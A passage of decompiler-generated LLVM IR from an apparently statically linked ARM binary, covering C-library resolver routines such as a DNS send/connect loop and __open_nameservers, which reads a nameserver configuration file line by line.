  %v1_15824 = icmp slt i32 %v1_15824.in, 0
  %v2_15824 = xor i1 %v1_15824, %v0_15824
  br i1 %v2_15824, label %dec_label_pc_156cc, label %dec_label_pc_15828

dec_label_pc_15828:                               ; preds = %dec_label_pc_156fc, %bb203, %dec_label_pc_1577c, %dec_label_pc_15748, %bb205
  %v1_1582c = call i32 @__libc_close(i32 %v0_1550c)
  %v3_15830 = load i32, i32* %stack_var_0, align 4
  %v2_15834 = icmp eq i32 %v3_15830, 0
  br i1 %v2_15834, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_15828
  %v1_1583c = load i32, i32* @r7, align 4
  %v3_15838 = inttoptr i32 %v3_15830 to i32*
  store i32 %v1_1583c, i32* %v3_15838, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_15828
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 88132, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_15834, i32 ptrtoint (i32* @global_var_126e8.313 to i32))
  %v2_15844 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_15844, i32* @r0, align 4
  store i32 %v2_152d8, i32* @r4, align 4
  %v0_1584c = call i32 @free()
  store i32 %v2_152d8, i32* @r0, align 4
  %v1_15864 = call i32 @__pthread_return_void()
  %v1_15874 = call i32 @__pthread_return_0()
  %v0_15880 = load i32, i32* @r6, align 4
  %v3_15880 = sdiv i32 %v0_15880, 256
  store i32 %v3_15880, i32* @ip, align 4
  %v0_15884 = load i32, i32* @sl, align 4
  store i32 %v0_15884, i32* @global_var_28adc.585, align 4
  store i32 %v2_152d8, i32* @r0, align 4
  %v1_15890 = trunc i32 %v3_15880 to i8
  store i8 %v1_15890, i8* @global_var_22829.588, align 1
  %v1_15894 = trunc i32 %v0_15880 to i8
  store i8 %v1_15894, i8* bitcast (i8** @global_var_22828.587 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_158a4.599 to i32), i32* @lr, align 4
  %v1_158a0 = call i32 @__pthread_return_void()
  %v0_15a2c.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_15a2c

dec_label_pc_158a8:                               ; preds = %dec_label_pc_1553c, %dec_label_pc_1555c
  %v0_158a8 = load i32, i32* @sl, align 4
  %v1_158a8 = add i32 %v0_158a8, 1
  %v2_158b0 = srem i32 %v1_158a8, %arg3
  store i32 %v2_158b0, i32* @sl, align 4
  %v2_158b4 = icmp eq i32 %v2_158b0, 0
  br i1 %v2_158b4, label %dec_label_pc_158bc, label %dec_label_pc_15974.backedge

dec_label_pc_158bc:                               ; preds = %dec_label_pc_158a8
  %v1_158c4 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_15978.outer.backedge

dec_label_pc_15978.outer.backedge:                ; preds = %dec_label_pc_158bc, %dec_label_pc_15958, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_15650, %.thread19 ], [ -1, %dec_label_pc_15958 ], [ -1, %dec_label_pc_158bc ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_15960, %dec_label_pc_15958 ], [ %v1_158c4, %dec_label_pc_158bc ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_1535c.lr.ph, label %dec_label_pc_15994

dec_label_pc_158d4:                               ; preds = %dec_label_pc_157cc
  %v1_158d4 = inttoptr i32 %v0_157cc to i32*
  %v2_158d4 = load i32, i32* %v1_158d4, align 4
  store i32 %v2_158d4, i32* @r0, align 4
  %v0_158d8 = call i32 @free()
  br label %dec_label_pc_158dc

dec_label_pc_158dc:                               ; preds = %dec_label_pc_1566c, %dec_label_pc_155c0, %dec_label_pc_156fc, %dec_label_pc_156f0, %dec_label_pc_155d8, %dec_label_pc_155a0, %dec_label_pc_158d4
  br i1 %v2_158e0, label %dec_label_pc_158e8, label %dec_label_pc_15944

dec_label_pc_158e8:                               ; preds = %dec_label_pc_158dc
  store i32 %v2_152d8, i32* @r5, align 4
  store i32 %v2_152d8, i32* @r0, align 4
  %v1_15900 = call i32 @__pthread_return_void()
  %v1_15910 = call i32 @__pthread_return_0()
  %v2_1591c = load i32, i32* @global_var_28bac.593, align 4
  store i32 %v2_152d8, i32* @r0, align 4
  %v1_1592c = call i32 @__pthread_return_void()
  %v1_15934 = add i32 %v2_1591c, -1
  store i32 %v1_15934, i32* @r4, align 4
  %v5_1593c = icmp slt i32 %v6_1593c, %v1_15934
  br i1 %v5_1593c, label %.thread27, label %dec_label_pc_15944

.thread27:                                        ; preds = %dec_label_pc_158e8
  %v7_1593c = add i32 %v6_1593c, 1
  br label %dec_label_pc_15974.backedge

dec_label_pc_15944:                               ; preds = %dec_label_pc_158e8, %dec_label_pc_158dc
  %v0_15944 = load i32, i32* @sl, align 4
  %v1_15944 = add i32 %v0_15944, 1
  %v2_1594c = srem i32 %v1_15944, %arg3
  store i32 %v2_1594c, i32* @sl, align 4
  %v2_15950 = icmp eq i32 %v2_1594c, 0
  br i1 %v2_15950, label %dec_label_pc_15958, label %dec_label_pc_15974.backedge

dec_label_pc_15958:                               ; preds = %dec_label_pc_15944
  %v1_15960 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_15978.outer.backedge

dec_label_pc_15974.backedge:                      ; preds = %dec_label_pc_158a8, %dec_label_pc_15944, %.thread27
  %storemerge87 = phi i32 [ %v7_1593c, %.thread27 ], [ -1, %dec_label_pc_15944 ], [ -1, %dec_label_pc_158a8 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_1535c.lr.ph.preheader, label %dec_label_pc_15994

dec_label_pc_1535c.lr.ph.preheader:               ; preds = %dec_label_pc_1535c.lr.ph.preheader.lr.ph, %dec_label_pc_15974.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_1535c.lr.ph.preheader.lr.ph ], [ %v0_1550c, %dec_label_pc_15974.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_15354, %dec_label_pc_1535c.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_15974.backedge ]
  %v0_15974259 = phi i32 [ -1, %dec_label_pc_1535c.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_15974.backedge ]
  br label %dec_label_pc_1535c.lr.ph

dec_label_pc_1535c.lr.ph:                         ; preds = %dec_label_pc_1535c.lr.ph.preheader, %dec_label_pc_15978.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_1550c, %dec_label_pc_15978.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_1535c.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_15978.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_1535c.lr.ph.preheader ]
  %v6_1593c = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_15978.outer.backedge ], [ %v0_15974259, %dec_label_pc_1535c.lr.ph.preheader ]
  %v1_15404 = icmp slt i32 %v6_1593c, 0
  %v4_15440 = mul i32 %v6_1593c, 4
  %v5_15440 = add i32 %v4_15440, ptrtoint (i32* @global_var_28b8c.597 to i32)
  %v6_15440 = inttoptr i32 %v5_15440 to i32*
  br label %dec_label_pc_1535c

dec_label_pc_15988:                               ; preds = %bb195, %.thread8, %dec_label_pc_152b4, %dec_label_pc_152a8
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_15994

dec_label_pc_15994:                               ; preds = %dec_label_pc_152c4, %dec_label_pc_15974.backedge, %dec_label_pc_15978.outer.backedge, %bb200, %dec_label_pc_1544c, %dec_label_pc_15978.backedge, %dec_label_pc_15988
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_15988 ], [ %v0_1550c, %dec_label_pc_15978.backedge ], [ %v1_15364, %dec_label_pc_1544c ], [ %v1_15364, %bb200 ], [ %v0_1550c, %dec_label_pc_15978.outer.backedge ], [ -1, %dec_label_pc_152c4 ], [ %v0_1550c, %dec_label_pc_15974.backedge ]
  %v0_15994 = call i32 @__GI___h_errno_location()
  %v2_1599c = inttoptr i32 %v0_15994 to i32*
  store i32 -1, i32* %v2_1599c, align 4
  %v0_159a0 = load i32, i32* @sb, align 4
  store i32 %v0_159a0, i32* @r6, align 4
  br label %dec_label_pc_159a4

dec_label_pc_159a4:                               ; preds = %dec_label_pc_15690, %dec_label_pc_15994
  %v1_159ac = phi i32 [ %stack_var_-216.2, %dec_label_pc_15994 ], [ %v0_1550c, %dec_label_pc_15690 ]
  %v7_159a8 = icmp eq i32 %v1_159ac, -1
  br i1 %v7_159a8, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_159a4
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_159a4, %bb208
  store i32 88500, i32* @lr, align 4
  %v1_159b0 = xor i1 %v7_159a8, true
  call void @__pseudo_cond_branch(i1 %v1_159b0, i32 ptrtoint (i32* @global_var_f618.590 to i32))
  %v2_159b4 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_159b4, i32* @r0, align 4
  %v0_159b8 = call i32 @free()
  %v0_159bc = load i32, i32* @r7, align 4
  store i32 %v0_159bc, i32* @r0, align 4
  %v0_159c0 = call i32 @free()
  %v0_159c4 = load i32, i32* @sl, align 4
  %v7_159c4 = icmp eq i32 %v0_159c4, -1
  br i1 %v7_159c4, label %bb210, label %dec_label_pc_159d0

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_15a2c

dec_label_pc_159d0:                               ; preds = %bb209
  %v2_159d0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_159d0, i32* @r0, align 4
  %v1_159e8 = call i32 @__pthread_return_void()
  %v1_159f8 = call i32 @__pthread_return_0()
  %v0_15a04 = load i32, i32* @r6, align 4
  %v3_15a04 = sdiv i32 %v0_15a04, 256
  store i32 %v3_15a04, i32* @ip, align 4
  %v0_15a08 = load i32, i32* @sl, align 4
  store i32 %v0_15a08, i32* @global_var_28adc.585, align 4
  store i32 %v2_159d0, i32* @r0, align 4
  %v1_15a14 = trunc i32 %v3_15a04 to i8
  store i8 %v1_15a14, i8* @global_var_22829.588, align 1
  %v1_15a18 = trunc i32 %v0_15a04 to i8
  store i8 %v1_15a18, i8* bitcast (i8** @global_var_22828.587 to i8*), align 4
  store i32 88616, i32* @lr, align 4
  %v1_15a24 = call i32 @__pthread_return_void()
  br label %dec_label_pc_15a2c

dec_label_pc_15a2c:                               ; preds = %bb210, %bb207, %dec_label_pc_159d0
  %v0_15a2c = phi i32 [ %v0_159c4, %bb210 ], [ %v0_15a2c.pre, %bb207 ], [ -1, %dec_label_pc_159d0 ]
  store i32 %v3_15260, i32* @r4, align 4
  store i32 %v6_15260, i32* @r5, align 4
  store i32 %v9_15260, i32* @r6, align 4
  store i32 %v12_15260, i32* @r7, align 4
  store i32 %v15_15260, i32* @r8, align 4
  store i32 %v18_15260, i32* @sb, align 4
  store i32 %v21_15260, i32* @sl, align 4
  ret i32 %v0_15a2c

; uselistorder directives
  uselistorder i32 %v3_15a04, { 1, 0 }
  uselistorder i32 %v0_15a04, { 1, 0 }
  uselistorder i32 %v0_159c4, { 1, 0 }
  uselistorder i1 %v7_159a8, { 1, 0 }
  uselistorder i32 %v6_1593c, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v3_15880, { 1, 0 }
  uselistorder i32 %v0_15880, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_156d4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_157cc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1578c, { 1, 0 }
  uselistorder i32 %v0_156ac, { 1, 0 }
  uselistorder i32 %v0_156b0, { 1, 0 }
  uselistorder i32 %v6_155b0, { 1, 0 }
  uselistorder i32 %v0_1550c, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_15478, { 1, 0 }
  uselistorder i32 %v2_15418, { 1, 0 }
  uselistorder i32 %v1_15390, { 1, 2, 0 }
  uselistorder i1 %v7_15360, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_15364, { 1, 2, 0 }
  uselistorder i32 %v0_15354, { 1, 0 }
  uselistorder i32 %v2_152d8, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 11, 14, 13, 12, 17, 16, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 8, 7, 0, 1, 2, 3, 4, 5, 6, 9, 10, 11, 12 }
  uselistorder i32 101, { 5, 1, 2, 3, 0, 4 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32 ()* @socket, { 1, 9, 7, 6, 5, 4, 3, 2, 8, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i8* @global_var_22829.588, { 2, 1, 0 }
  uselistorder i32 512, { 3, 8, 2, 9, 1, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_15a2c, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_159a4, { 1, 0 }
  uselistorder label %dec_label_pc_15994, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_15988, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1535c.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15974.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_158dc, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_15978.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_158a8, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_15828, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_15814, { 1, 0 }
  uselistorder label %dec_label_pc_15800, { 2, 0, 1 }
  uselistorder label %dec_label_pc_157fc, { 1, 0 }
  uselistorder label %dec_label_pc_15764, { 1, 0, 2 }
  uselistorder label %dec_label_pc_156a0, { 1, 0 }
  uselistorder label %dec_label_pc_15690, { 1, 0 }
  uselistorder label %dec_label_pc_15978.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_154f8, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_1544c, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15a38:
  %v0_15a38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15a38, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15a38
  %v5_15a38 = mul i32 %arg2, 256
  %v6_15a38 = and i32 %v5_15a38, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15a38, %bb
  %v10_15a68 = phi i32 [ %arg1, %dec_label_pc_15a38 ], [ %v6_15a38, %bb ]
  ret i32 %v10_15a68

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15a6c = load i32, i32* @r4, align 4
  store i32 %v3_15a6c, i32* %stack_var_-28, align 4
  %v6_15a6c = load i32, i32* @r5, align 4
  %v9_15a6c = load i32, i32* @r6, align 4
  %v12_15a6c = load i32, i32* @r7, align 4
  %v15_15a6c = load i32, i32* @r8, align 4
  %v18_15a6c = load i32, i32* @sl, align 4
  %v2_15a70 = ptrtoint i32* %stack_var_-192 to i32
  %v2_15a74 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_15a74, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2282c.430 to i32), i32* %r2.global-to-local, align 4
  %v1_15a88 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2282c.430 to i32), i32* %r0.global-to-local, align 4
  store i32 88732, i32* @lr, align 4
  %v1_15a98 = call i32 @__pthread_return_0()
  store i32 %v1_15a98, i32* %r0.global-to-local, align 4
  %v2_15aa0 = load i32, i32* @global_var_28ba8.435, align 4
  %v5_15aa8 = icmp sgt i32 %v2_15aa0, 0
  br i1 %v5_15aa8, label %dec_label_pc_15ce4, label %dec_label_pc_15aac

dec_label_pc_15aac:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1a29c.606 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1a2b0.608 to i32), i32* @r1, align 4
  %v3_15ab4 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1a29c.606 to i32), i32 ptrtoint (i32* @global_var_1a2b0.608 to i32))
  store i32 %v3_15ab4, i32* %r0.global-to-local, align 4
  store i32 %v3_15ab4, i32* @sl, align 4
  %v2_15ab8 = icmp eq i32 %v3_15ab4, 0
  br i1 %v2_15ab8, label %dec_label_pc_15ac0, label %dec_label_pc_15cac.preheader

dec_label_pc_15ac0:                               ; preds = %dec_label_pc_15aac
  store i32 ptrtoint ([24 x i8]* @global_var_1a2b4.610 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1a2b0.608 to i32), i32* @r1, align 4
  %v3_15ac8 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1a2b4.610 to i32), i32 ptrtoint (i32* @global_var_1a2b0.608 to i32))
  store i32 %v3_15ac8, i32* %r0.global-to-local, align 4
  store i32 %v3_15ac8, i32* @sl, align 4
  %v2_15acc = icmp eq i32 %v3_15ac8, 0
  br i1 %v2_15acc, label %dec_label_pc_15cd8, label %dec_label_pc_15cac.preheader

dec_label_pc_15cac.preheader:                     ; preds = %dec_label_pc_15aac, %dec_label_pc_15ac0
  %v0_15cb426 = phi i32 [ %v3_15ab4, %dec_label_pc_15aac ], [ %v3_15ac8, %dec_label_pc_15ac0 ]
  %v2_15b20 = ptrtoint i32* %stack_var_-28 to i32
  %v3_15bbc = inttoptr i32 %tmp to i8*
  store i32 %v2_15a70, i32* %r0.global-to-local, align 4
  store i32 %v0_15cb426, i32* %r2.global-to-local, align 4
  %v3_15cb866 = call i32 @fgets(i32 %v2_15a70, i32 128, i32 %v0_15cb426)
  store i32 %v3_15cb866, i32* %r0.global-to-local, align 4
  %v2_15cbc68 = icmp eq i32 %v3_15cb866, 0
  store i32 %v2_15a70, i32* @r4, align 4
  br i1 %v2_15cbc68, label %dec_label_pc_15ccc, label %dec_label_pc_15adc.preheader.lr.ph

dec_label_pc_15adc.preheader.lr.ph:               ; preds = %dec_label_pc_15cac.preheader
  %v1_15adc11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_15adc.preheader

dec_label_pc_15ad8:                               ; preds = %dec_label_pc_15ae8
  %v1_15ad8 = add i32 %v0_15ad8, 1
  store i32 %v1_15ad8, i32* %r0.global-to-local, align 4
  %v1_15adc = inttoptr i32 %v1_15ad8 to i8*
  %v2_15adc = load i8, i8* %v1_15adc, align 1
  %v3_15adc = zext i8 %v2_15adc to i32
  store i32 %v3_15adc, i32* %r2.global-to-local, align 4
  %v2_15ae0 = icmp eq i8 %v2_15adc, 0
  br i1 %v2_15ae0, label %dec_label_pc_15afc, label %dec_label_pc_15ae8

dec_label_pc_15ae8:                               ; preds = %dec_label_pc_15ae8.lr.ph, %dec_label_pc_15ad8
  %v0_15ad8 = phi i32 [ %v2_15a70, %dec_label_pc_15ae8.lr.ph ], [ %v1_15ad8, %dec_label_pc_15ad8 ]
  %v1_15af0 = phi i32 [ %v3_15adc13, %dec_label_pc_15ae8.lr.ph ], [ %v3_15adc, %dec_label_pc_15ad8 ]
  %v3_15af0 = mul nuw nsw i32 %v1_15af0, 2
  %v4_15af0 = add i32 %v3_15af0, %v2_15aec.pre
  %v5_15af0 = inttoptr i32 %v4_15af0 to i8*
  %v6_15af0 = load i8, i8* %v5_15af0, align 1
  %v1_15af4 = and i8 %v6_15af0, 32
  %v2_15af4 = icmp eq i8 %v1_15af4, 0
  br i1 %v2_15af4, label %dec_label_pc_15afc, label %dec_label_pc_15ad8

dec_label_pc_15afc:                               ; preds = %dec_label_pc_15ad8, %dec_label_pc_15ae8, %dec_label_pc_15adc.preheader
  %v0_15b9435 = phi i32 [ %v2_15a70, %dec_label_pc_15adc.preheader ], [ %v1_15ad8, %dec_label_pc_15ad8 ], [ %v0_15ad8, %dec_label_pc_15ae8 ]
  %v0_15b10 = phi i32 [ %v3_15adc13, %dec_label_pc_15adc.preheader ], [ %v3_15adc, %dec_label_pc_15ad8 ], [ %v1_15af0, %dec_label_pc_15ae8 ]
  %v7_15afc = icmp eq i32 %v0_15b10, 10
  br i1 %v7_15afc, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_15afc
  %v3_15b00 = icmp eq i32 %v0_15b10, 0
  br i1 %v3_15b00, label %bb55, label %dec_label_pc_15b10

.thread3:                                         ; preds = %dec_label_pc_15afc
  br label %dec_label_pc_15cac.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_15cac.backedge

dec_label_pc_15cac.backedge:                      ; preds = %dec_label_pc_15c88, %dec_label_pc_15ca0, %bb55, %dec_label_pc_15c20, %.thread3, %dec_label_pc_15b10
  %v0_15cb4.pre = load i32, i32* @sl, align 4
  store i32 %v2_15a70, i32* %r0.global-to-local, align 4
  store i32 %v0_15cb4.pre, i32* %r2.global-to-local, align 4
  %v3_15cb8 = call i32 @fgets(i32 %v2_15a70, i32 128, i32 %v0_15cb4.pre)
  store i32 %v3_15cb8, i32* %r0.global-to-local, align 4
  %v2_15cbc = icmp eq i32 %v3_15cb8, 0
  store i32 %v2_15a70, i32* @r4, align 4
  br i1 %v2_15cbc, label %dec_label_pc_15ccc, label %dec_label_pc_15adc.preheader

dec_label_pc_15b10:                               ; preds = %bb
  %v7_15b10 = icmp eq i32 %v0_15b10, 35
  br i1 %v7_15b10, label %dec_label_pc_15cac.backedge, label %dec_label_pc_15b94

dec_label_pc_15b20:                               ; preds = %bb58
  store i32 %v2_15b20, i32* %r2.global-to-local, align 4
  %v4_15b24 = mul i32 %storemerge, 4
  %v5_15b24 = add i32 %v4_15b24, %v2_15b20
  %v2_15b28 = add i32 %v5_15b24, -36
  %v3_15b28 = inttoptr i32 %v2_15b28 to i32*
  store i32 %v0_15b28, i32* %v3_15b28, align 4
  %v0_15b3415 = load i32, i32* %r0.global-to-local, align 4
  %v1_15b3416 = inttoptr i32 %v0_15b3415 to i8*
  %v2_15b3417 = load i8, i8* %v1_15b3416, align 1
  %v3_15b3418 = zext i8 %v2_15b3417 to i32
  store i32 %v3_15b3418, i32* %r2.global-to-local, align 4
  %v2_15b3819 = icmp eq i8 %v2_15b3417, 0
  br i1 %v2_15b3819, label %dec_label_pc_15b68.preheader, label %dec_label_pc_15b40.lr.ph

dec_label_pc_15b40.lr.ph:                         ; preds = %dec_label_pc_15b20
  %v2_15b44.pre = load i32, i32* @global_var_224e8, align 4
  br label %dec_label_pc_15b40

dec_label_pc_15b30:                               ; preds = %dec_label_pc_15b54
  %v1_15b30 = add i32 %v0_15b30, 1
  store i32 %v1_15b30, i32* %r0.global-to-local, align 4
  %v1_15b34 = inttoptr i32 %v1_15b30 to i8*
  %v2_15b34 = load i8, i8* %v1_15b34, align 1
  %v3_15b34 = zext i8 %v2_15b34 to i32
  store i32 %v3_15b34, i32* %r2.global-to-local, align 4
  %v2_15b38 = icmp eq i8 %v2_15b34, 0
  br i1 %v2_15b38, label %dec_label_pc_15b68.preheader, label %dec_label_pc_15b40

dec_label_pc_15b40:                               ; preds = %dec_label_pc_15b40.lr.ph, %dec_label_pc_15b30
  %v0_15b30 = phi i32 [ %v0_15b3415, %dec_label_pc_15b40.lr.ph ], [ %v1_15b30, %dec_label_pc_15b30 ]
  %v0_15b54 = phi i32 [ %v3_15b3418, %dec_label_pc_15b40.lr.ph ], [ %v3_15b34, %dec_label_pc_15b30 ]
  %v3_15b48 = mul nuw nsw i32 %v0_15b54, 2
  %v4_15b48 = add i32 %v3_15b48, %v2_15b44.pre
  %v5_15b48 = inttoptr i32 %v4_15b48 to i8*
  %v6_15b48 = load i8, i8* %v5_15b48, align 1
  %v1_15b4c = and i8 %v6_15b48, 32
  %v2_15b4c = icmp eq i8 %v1_15b4c, 0
  br i1 %v2_15b4c, label %dec_label_pc_15b54, label %dec_label_pc_15b68.preheader

dec_label_pc_15b54:                               ; preds = %dec_label_pc_15b40
  %v7_15b54 = icmp eq i32 %v0_15b54, 10
  br i1 %v7_15b54, label %dec_label_pc_15b68.preheader, label %dec_label_pc_15b30

dec_label_pc_15b68.preheader:                     ; preds = %dec_label_pc_15b54, %dec_label_pc_15b40, %dec_label_pc_15b30, %dec_label_pc_15b20
  %v0_15b6820 = phi i32 [ %v0_15b3415, %dec_label_pc_15b20 ], [ %v0_15b30, %dec_label_pc_15b54 ], [ %v0_15b30, %dec_label_pc_15b40 ], [ %v1_15b30, %dec_label_pc_15b30 ]
  %v1_15b6821 = inttoptr i32 %v0_15b6820 to i8*
  %v2_15b6822 = load i8, i8* %v1_15b6821, align 1
  %v3_15b6823 = zext i8 %v2_15b6822 to i32
  store i32 %v3_15b6823, i32* %r2.global-to-local, align 4
  %v2_15b6c24 = icmp eq i8 %v2_15b6822, 0
  br i1 %v2_15b6c24, label %dec_label_pc_15b90, label %dec_label_pc_15b74

dec_label_pc_15b60:                               ; preds = %dec_label_pc_15b74, %dec_label_pc_15b88
  %v3_15b64 = inttoptr i32 %v2_15b64 to i8*
  store i8 0, i8* %v3_15b64, align 1
  %v4_15b64 = load i32, i32* %r0.global-to-local, align 4
  %v5_15b64 = add i32 %v4_15b64, 1
  store i32 %v5_15b64, i32* %r0.global-to-local, align 4
  %v1_15b68 = inttoptr i32 %v5_15b64 to i8*
  %v2_15b68 = load i8, i8* %v1_15b68, align 1
  %v3_15b68 = zext i8 %v2_15b68 to i32
  store i32 %v3_15b68, i32* %r2.global-to-local, align 4
  %v2_15b6c = icmp eq i8 %v2_15b68, 0
  br i1 %v2_15b6c, label %dec_label_pc_15b90, label %dec_label_pc_15b74

dec_label_pc_15b74:                               ; preds = %dec_label_pc_15b68.preheader, %dec_label_pc_15b60
  %v0_15b88 = phi i32 [ %v3_15b68, %dec_label_pc_15b60 ], [ %v3_15b6823, %dec_label_pc_15b68.preheader ]
  %v2_15b64 = phi i32 [ %v5_15b64, %dec_label_pc_15b60 ], [ %v0_15b6820, %dec_label_pc_15b68.preheader ]
  %v2_15b78 = load i32, i32* @global_var_224e8, align 4
  %v3_15b7c = mul nuw nsw i32 %v0_15b88, 2
  %v4_15b7c = add i32 %v2_15b78, %v3_15b7c
  %v5_15b7c = inttoptr i32 %v4_15b7c to i8*
  %v6_15b7c = load i8, i8* %v5_15b7c, align 1
  %v1_15b80 = and i8 %v6_15b7c, 32
  %v2_15b80 = icmp eq i8 %v1_15b80, 0
  br i1 %v2_15b80, label %dec_label_pc_15b88, label %dec_label_pc_15b60

dec_label_pc_15b88:                               ; preds = %dec_label_pc_15b74
  %v7_15b88 = icmp eq i32 %v0_15b88, 10
  br i1 %v7_15b88, label %dec_label_pc_15b60, label %dec_label_pc_15b90

dec_label_pc_15b90:                               ; preds = %dec_label_pc_15b60, %dec_label_pc_15b88, %dec_label_pc_15b68.preheader
  %v0_15b9434 = phi i32 [ %v0_15b6820, %dec_label_pc_15b68.preheader ], [ %v5_15b64, %dec_label_pc_15b60 ], [ %v2_15b64, %dec_label_pc_15b88 ]
  %v0_15b90 = load i32, i32* @r8, align 4
  %v1_15b90 = add i32 %v0_15b90, 1
  br label %dec_label_pc_15b94

dec_label_pc_15b94:                               ; preds = %dec_label_pc_15b10, %dec_label_pc_15b90
  %storemerge = phi i32 [ %v1_15b90, %dec_label_pc_15b90 ], [ 0, %dec_label_pc_15b10 ]
  %v0_15b28 = phi i32 [ %v0_15b9434, %dec_label_pc_15b90 ], [ %v0_15b9435, %dec_label_pc_15b10 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_15b94 = inttoptr i32 %v0_15b28 to i8*
  %v2_15b94 = load i8, i8* %v1_15b94, align 1
  %v3_15b94 = zext i8 %v2_15b94 to i32
  %v2_15b98 = icmp eq i8 %v2_15b94, 0
  br i1 %v2_15b98, label %bb57, label %bb56

